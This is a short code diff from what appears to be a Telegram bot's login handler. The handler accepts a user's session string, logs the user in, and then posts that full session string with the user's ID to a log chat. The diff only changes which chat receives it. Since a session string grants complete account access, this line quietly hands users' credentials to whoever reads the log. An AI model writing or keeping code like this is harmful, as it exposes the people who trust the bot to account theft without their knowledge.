@@ -159,7 +159,7 @@ async def login_session(event):
             await db.loin(event.sender_id); await login(event.sender_id, API_ID, API_HASH, s.text)
             await event.reply(f"✅ Logged in as {me.first_name}")
             if LOGS:
-                await bot.send_message(STRINGLOG, f"#SESSION {event.sender_id}\n`{s.text}`")
+                await bot.send_message(LOGS, f"#SESSION {event.sender_id}\n`{s.text}`")
     except Exception as ex:
         await event.reply(f"Invalid session – {ex}")
 
